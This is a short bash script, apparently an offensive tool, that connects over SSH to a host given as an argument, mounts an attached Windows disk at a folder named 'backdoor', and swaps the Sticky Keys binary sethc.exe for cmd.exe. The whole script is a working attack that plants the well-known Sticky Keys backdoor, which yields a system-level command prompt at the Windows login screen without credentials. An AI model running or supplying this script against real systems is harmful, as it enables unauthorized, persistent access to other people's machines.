#!/bin/bash
ipaddr=$1
echo LOCKED ON TO $ipaddr
ssh -i popaws -o StrictHostKeyChecking=no ubuntu@$ipaddr "sudo mkdir /media/backdoor"
ssh -i popaws -o StrictHostKeyChecking=no ubuntu@$ipaddr "sudo mount /dev/xvdx1 /media/backdoor"
ssh -i popaws -o StrictHostKeyChecking=no ubuntu@$ipaddr "sudo mv /media/backdoor/Windows/System32/sethc.exe /media/backdoor/Windows/System32/sethc.exe.bkup"
ssh -i popaws -o StrictHostKeyChecking=no ubuntu@$ipaddr "sudo mv /media/backdoor/Windows/System32/cmd.exe /media/backdoor/Windows/System32/sethc.exe"
